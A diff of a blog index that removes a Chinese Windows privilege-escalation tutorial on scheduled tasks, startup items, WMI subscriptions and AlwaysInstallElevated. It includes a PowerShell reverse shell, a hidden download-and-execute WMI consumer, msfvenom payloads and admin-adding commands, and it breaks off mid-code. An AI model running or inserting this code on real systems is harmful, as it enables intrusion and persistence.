@@ -141,7 +141,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-count">125</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -175,207 +175,6 @@
     </div>
 
     <div class="main-inner index posts-expand">
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-scheduled-tasks/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="YunShang">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="渗透测试实战记录">
-      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 渗透测试实战记录">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/Windows-privesc-scheduled-tasks/" class="post-title-link" itemprop="url">Windows提权：计划任务与启动项</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-12-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-12-15T08:00:00+08:00">2024-12-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在Windows渗透测试中，计划任务（Scheduled Tasks）和启动项（Startup Items）常以高权限身份运行，是提权的核心目标。本文系统梳理七种与计划任务和启动项相关的提权技术，提供检测与利用示例。</p>
-<blockquote>
-<p><strong>免责声明</strong>：本文所述技术仅供安全研究和授权渗透测试使用。未经授权对他人系统实施攻击属于违法行为。</p>
-</blockquote>
-<hr>
-<h2 id="一、计划任务枚举（schtasks-Enumeration）"><a href="#一、计划任务枚举（schtasks-Enumeration）" class="headerlink" title="一、计划任务枚举（schtasks Enumeration）"></a>一、计划任务枚举（schtasks Enumeration）</h2><h3 id="1-1-基本枚举"><a href="#1-1-基本枚举" class="headerlink" title="1.1 基本枚举"></a>1.1 基本枚举</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br><span class="line">schtasks /query /fo CSV /v &gt; tasks.csv</span><br><span class="line">schtasks /query /fo TABLE</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-2-PowerShell枚举"><a href="#1-2-PowerShell枚举" class="headerlink" title="1.2 PowerShell枚举"></a>1.2 PowerShell枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ScheduledTask</span> | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$actions</span> = (<span class="variable">$_</span>.Actions | <span class="built_in">ForEach-Object</span> &#123; <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.Execute) <span class="variable">$</span>(<span class="variable">$_</span>.Arguments)&quot;</span> &#125;) <span class="operator">-join</span> <span class="string">&quot;; &quot;</span></span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.TaskName) | <span class="variable">$</span>(<span class="variable">$_</span>.State) | <span class="variable">$actions</span>&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-3-重点目标"><a href="#1-3-重点目标" class="headerlink" title="1.3 重点目标"></a>1.3 重点目标</h3><p>枚举时应关注：以<code>NT AUTHORITY\SYSTEM</code>运行的任务、操作指向用户可写目录（<code>C:\Users\Public\</code>）的任务、路径不含引号可能被劫持的任务、触发器为<code>At logon</code>或<code>At startup</code>的任务。</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -dqv &quot;C:\Windows\System32\Tasks&quot;</span><br><span class="line">accesschk.exe -qv &quot;C:\Windows\System32\Tasks\Microsoft\Windows\UpdateOrchestrator\Reboot&quot;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="二、启动文件夹利用（Startup-Folder-Exploitation）"><a href="#二、启动文件夹利用（Startup-Folder-Exploitation）" class="headerlink" title="二、启动文件夹利用（Startup Folder Exploitation）"></a>二、启动文件夹利用（Startup Folder Exploitation）</h2><h3 id="2-1-关键路径"><a href="#2-1-关键路径" class="headerlink" title="2.1 关键路径"></a>2.1 关键路径</h3><table>
-<thead>
-<tr>
-<th>启动文件夹</th>
-<th>路径</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>当前用户</td>
-<td><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></td>
-</tr>
-<tr>
-<td>所有用户</td>
-<td><code>%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></td>
-</tr>
-</tbody></table>
-<h3 id="2-2-权限检查与利用"><a href="#2-2-权限检查与利用" class="headerlink" title="2.2 权限检查与利用"></a>2.2 权限检查与利用</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;<span class="variable">%PROGRAMDATA%</span>\Microsoft\Windows\<span class="built_in">Start</span> Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查写入权限</span></span><br><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;<span class="variable">$env:ProgramData</span>\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span>).Access | </span><br><span class="line">    <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.FileSystemRights <span class="operator">-match</span> <span class="string">&quot;Write|FullControl&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p>若对<code>%PROGRAMDATA%</code>启动文件夹可写，可放置恶意文件等待管理员登录触发：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> <span class="string">&quot;C:\temp\payload.exe&quot;</span> <span class="literal">-Destination</span> <span class="string">&quot;<span class="variable">$env:ProgramData</span>\Microsoft\Windows\Start Menu\Programs\Startup\update.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或创建隐蔽快捷方式</span></span><br><span class="line"><span class="variable">$sc</span> = (<span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell).CreateShortcut(<span class="string">&quot;<span class="variable">$env:ProgramData</span>\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$sc</span>.TargetPath = <span class="string">&quot;C:\temp\payload.exe&quot;</span>; <span class="variable">$sc</span>.WindowStyle = <span class="number">7</span>; <span class="variable">$sc</span>.Save()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="三、注册表Run与RunOnce键"><a href="#三、注册表Run与RunOnce键" class="headerlink" title="三、注册表Run与RunOnce键"></a>三、注册表Run与RunOnce键</h2><h3 id="3-1-关键注册表位置"><a href="#3-1-关键注册表位置" class="headerlink" title="3.1 关键注册表位置"></a>3.1 关键注册表位置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-2-枚举"><a href="#3-2-枚举" class="headerlink" title="3.2 枚举"></a>3.2 枚举</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-3-添加与劫持"><a href="#3-3-添加与劫持" class="headerlink" title="3.3 添加与劫持"></a>3.3 添加与劫持</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加恶意条目</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;WindowsUpdate&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Users\Public\payload.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用reg命令</span></span><br><span class="line">reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /t REG_SZ /d <span class="string">&quot;C:\temp\payload.exe&quot;</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查现有Run键引用文件是否可写</span></span><br><span class="line"><span class="variable">$runItems</span> = <span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$p</span> <span class="keyword">in</span> <span class="variable">$runItems</span>.PSObject.Properties) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$p</span>.Name <span class="operator">-notmatch</span> <span class="string">&quot;PS&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$acl</span> = <span class="built_in">Get-Acl</span> <span class="variable">$p</span>.Value <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$acl</span>.Access | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.FileSystemRights <span class="operator">-match</span> <span class="string">&quot;Write|FullControl&quot;</span>&#125;) &#123;</span><br><span class="line">            <span class="built_in">Write-Host</span> <span class="string">&quot;[!] 可劫持: <span class="variable">$</span>(<span class="variable">$p</span>.Name) -&gt; <span class="variable">$</span>(<span class="variable">$p</span>.Value)&quot;</span> <span class="literal">-ForegroundColor</span> Red</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="四、计划任务脚本劫持"><a href="#四、计划任务脚本劫持" class="headerlink" title="四、计划任务脚本劫持"></a>四、计划任务脚本劫持</h2><h3 id="4-1-查找可写任务文件"><a href="#4-1-查找可写任务文件" class="headerlink" title="4.1 查找可写任务文件"></a>4.1 查找可写任务文件</h3><p>计划任务配置存储在<code>C:\Windows\System32\Tasks\</code>下的XML文件中。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="string">&quot;C:\Windows\System32\Tasks&quot;</span> <span class="literal">-Recurse</span> <span class="operator">-File</span> | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$acl</span> = <span class="built_in">Get-Acl</span> <span class="variable">$_</span>.FullName</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$acl</span>.Access | <span class="built_in">Where-Object</span> &#123;</span><br><span class="line">        <span class="variable">$_</span>.IdentityReference <span class="operator">-eq</span> [<span class="type">Security.Principal.WindowsIdentity</span>]::GetCurrent().Name <span class="operator">-and</span></span><br><span class="line">        <span class="variable">$_</span>.FileSystemRights <span class="operator">-match</span> <span class="string">&quot;Write|FullControl|Modify&quot;</span>&#125;) &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;[!] 可写: <span class="variable">$</span>(<span class="variable">$_</span>.FullName)&quot;</span> <span class="literal">-ForegroundColor</span> Red</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-2-查找调用脚本的任务"><a href="#4-2-查找调用脚本的任务" class="headerlink" title="4.2 查找调用脚本的任务"></a>4.2 查找调用脚本的任务</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ScheduledTask</span> | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">in</span> <span class="variable">$_</span>.Actions) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>.Arguments <span class="operator">-match</span> <span class="string">&quot;\.ps1|\.bat|\.cmd|\.vbs&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.TaskName): <span class="variable">$</span>(<span class="variable">$a</span>.Execute) <span class="variable">$</span>(<span class="variable">$a</span>.Arguments)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-3-劫持示例"><a href="#4-3-劫持示例" class="headerlink" title="4.3 劫持示例"></a>4.3 劫持示例</h3><p>假设发现SYSTEM权限的<code>DailyBackup</code>任务执行<code>powershell.exe -File C:\Scripts\backup.ps1</code>，且该脚本可写：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> <span class="string">&quot;C:\Scripts\backup.ps1&quot;</span> <span class="string">&quot;C:\Scripts\backup.ps1.bak&quot;</span></span><br><span class="line"><span class="string">@&#x27;</span></span><br><span class="line"><span class="string">$c=New-Object Net.Sockets.TCPClient(&quot;10.10.14.5&quot;,4444);$s=$c.GetStream()</span></span><br><span class="line"><span class="string">[byte[]]$b=0..65535|%&#123;0&#125;</span></span><br><span class="line"><span class="string">while(($i=$s.Read($b,0,$b.Length))-ne0)&#123;</span></span><br><span class="line"><span class="string">$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)</span></span><br><span class="line"><span class="string">$r=(iex $d 2&gt;&amp;1|Out-String);$r2=$r+&quot;PS&gt;&quot;</span></span><br><span class="line"><span class="string">$sb=([text.encoding]::ASCII).GetBytes($r2)</span></span><br><span class="line"><span class="string">$s.Write($sb,0,$sb.Length);$s.Flush()&#125;;$c.Close()</span></span><br><span class="line"><span class="string">&#x27;@</span> | <span class="built_in">Out-File</span> <span class="string">&quot;C:\Scripts\backup.ps1&quot;</span> <span class="literal">-Force</span></span><br><span class="line">schtasks /run /tn <span class="string">&quot;DailyBackup&quot;</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、WMI事件订阅持久化与提权"><a href="#五、WMI事件订阅持久化与提权" class="headerlink" title="五、WMI事件订阅持久化与提权"></a>五、WMI事件订阅持久化与提权</h2><h3 id="5-1-原理"><a href="#5-1-原理" class="headerlink" title="5.1 原理"></a>5.1 原理</h3><p>WMI事件订阅由三部分组成，触发后以SYSTEM权限执行代码：</p>
-<ul>
-<li><strong>__EventFilter</strong>：定义触发条件</li>
-<li><strong>CommandLineEventConsumer &#x2F; ActiveScriptEventConsumer</strong>：定义操作</li>
-<li><strong>__FilterToConsumerBinding</strong>：绑定二者</li>
-</ul>
-<h3 id="5-2-检测现有订阅"><a href="#5-2-检测现有订阅" class="headerlink" title="5.2 检测现有订阅"></a>5.2 检测现有订阅</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter GET Name, Query /<span class="built_in">format</span>:list</span><br><span class="line">wmic /namespace:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> CommandLineEventConsumer GET Name, CommandLineTemplate /<span class="built_in">format</span>:list</span><br><span class="line">wmic /namespace:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> ActiveScriptEventConsumer GET Name, ScriptText /<span class="built_in">format</span>:list</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __EventFilter</span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> CommandLineEventConsumer</span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> ActiveScriptEventConsumer</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-3-创建WMI提权订阅"><a href="#5-3-创建WMI提权订阅" class="headerlink" title="5.3 创建WMI提权订阅"></a>5.3 创建WMI提权订阅</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤器：系统启动300秒后触发</span></span><br><span class="line"><span class="variable">$filter</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __EventFilter <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="string">&quot;SysMaintenance&quot;</span></span><br><span class="line">    EventNamespace = <span class="string">&quot;root\cimv2&quot;</span></span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span></span><br><span class="line">    Query = <span class="string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 300&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消费者：SYSTEM权限执行反弹Shell</span></span><br><span class="line"><span class="variable">$consumer</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="string">&quot;SysMaintenanceConsumer&quot;</span></span><br><span class="line">    CommandLineTemplate = <span class="string">&#x27;powershell.exe -NoP -W Hidden -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;</span><span class="string">&#x27;http://10.10.14.5/r.ps1&#x27;</span><span class="string">&#x27;)&quot;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定</span></span><br><span class="line"><span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    <span class="keyword">Filter</span> = <span class="variable">$filter</span>; Consumer = <span class="variable">$consumer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-4-VBScript消费者"><a href="#5-4-VBScript消费者" class="headerlink" title="5.4 VBScript消费者"></a>5.4 VBScript消费者</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> ActiveScriptEventConsumer <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="string">&quot;VbsPayload&quot;</span></span><br><span class="line">    ScriptingEngine = <span class="string">&quot;VBScript&quot;</span></span><br><span class="line">    ScriptText = <span class="string">&#x27;Set o=CreateObject(&quot;WScript.Shell&quot;):o.Run &quot;cmd /c net localgroup administrators lowuser /add&quot;,0,False&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-5-清除"><a href="#5-5-清除" class="headerlink" title="5.5 清除"></a>5.5 清除</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __EventFilter | ?&#123;<span class="variable">$_</span>.Name <span class="operator">-match</span> <span class="string">&quot;SysMaintenance|VbsPayload&quot;</span>&#125; | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> CommandLineEventConsumer | ?&#123;<span class="variable">$_</span>.Name <span class="operator">-match</span> <span class="string">&quot;SysMaintenance&quot;</span>&#125; | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __FilterToConsumerBinding | <span class="built_in">Remove-WmiObject</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="六、AlwaysInstallElevated注册表提权"><a href="#六、AlwaysInstallElevated注册表提权" class="headerlink" title="六、AlwaysInstallElevated注册表提权"></a>六、AlwaysInstallElevated注册表提权</h2><h3 id="6-1-原理"><a href="#6-1-原理" class="headerlink" title="6.1 原理"></a>6.1 原理</h3><p>当HKCU和HKLM的<code>AlwaysInstallElevated</code>同时为<code>0x1</code>时，普通用户安装的MSI包将以SYSTEM权限运行。</p>
-<h3 id="6-2-检测"><a href="#6-2-检测" class="headerlink" title="6.2 检测"></a>6.2 检测</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hkcu</span> = (<span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKCU:\Software\Policies\Microsoft\Windows\Installer&quot;</span> <span class="literal">-Name</span> AlwaysInstallElevated <span class="literal">-EA</span> <span class="number">0</span>).AlwaysInstallElevated</span><br><span class="line"><span class="variable">$hklm</span> = (<span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKLM:\Software\Policies\Microsoft\Windows\Installer&quot;</span> <span class="literal">-Name</span> AlwaysInstallElevated <span class="literal">-EA</span> <span class="number">0</span>).AlwaysInstallElevated</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$hkcu</span> <span class="operator">-eq</span> <span class="number">1</span> <span class="operator">-and</span> <span class="variable">$hklm</span> <span class="operator">-eq</span> <span class="number">1</span>) &#123; <span class="built_in">Write-Host</span> <span class="string">&quot;[!] AlwaysInstallElevated 已启用&quot;</span> <span class="literal">-ForegroundColor</span> Red &#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-3-利用"><a href="#6-3-利用" class="headerlink" title="6.3 利用"></a>6.3 利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机生成MSI</span></span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o payload.msi</span><br><span class="line">msfvenom -p windows/x64/exec CMD=<span class="string">&quot;net localgroup administrators user /add&quot;</span> -f msi -o adduser.msi</span><br></pre></td></tr></table></figure>
-
-<p>在目标机执行：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\temp\payload.msi</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="七、DLL搜索顺序劫持（DLL-Search-Order-Hijacking）"><a href="#七、DLL搜索顺序劫持（DLL-Search-Order-Hijacking）" class="headerlink" title="七、DLL搜索顺序劫持（DLL Search Order Hijacking）"></a>七、DLL搜索顺序劫持（DLL Search Order Hijacking）</h2><h3 id="7-1-Windows-DLL搜索顺序"><a href="#7-1-Windows-DLL搜索顺序" class="headerlink" title="7.1 Windows DLL搜索顺序"></a>7.1 Windows DLL搜索顺序</h3><p>启用SafeDllSearchMode（默认）时的搜索顺序：</p>
-<ol>
-<li>应用程序所在目录 → 2. <code>System32\</code> → 3. <code>System\</code> → 4. <code>Windows\</code> → 5. 当前工作目录 → 6. PATH目录</li>
-</ol>
-<p>若高权限进程所在目录缺失DLL且该目录对低权限用户可写，即可实施劫持。</p>
-<h3 id="7-2-使用ProcMon发现机会"><a href="#7-2-使用ProcMon发现机会" class="headerlink" title="7.2 使用ProcMon发现机会"></a>7.2 使用ProcMon发现机会</h3><p>用Process Monitor筛选计划任务进程，过滤器设为：<code>Result</code> &#x3D; <code>NAME NOT FOUND</code>，<code>Path</code>以<code>.dll</code>结尾。这些即为可劫持的缺失DLL。</p>
-<h3 id="7-3-检测可写目录"><a href="#7-3-检测可写目录" class="headerlink" title="7.3 检测可写目录"></a>7.3 检测可写目录</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$commonDlls</span> = <span class="selector-tag">@</span>(<span class="string">&quot;version.dll&quot;</span>,<span class="string">&quot;dbghelp.dll&quot;</span>,<span class="string">&quot;profapi.dll&quot;</span>,<span class="string">&quot;vcruntime140.dll&quot;</span>,<span class="string">&quot;msvcp140.dll&quot;</span>,<span class="string">&quot;cryptbase.dll&quot;</span>)</span><br><span class="line"><span class="variable">$paths</span> = <span class="built_in">Get-ScheduledTask</span> | <span class="built_in">ForEach-Object</span> &#123; <span class="variable">$_</span>.Actions.Execute &#125; | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span> <span 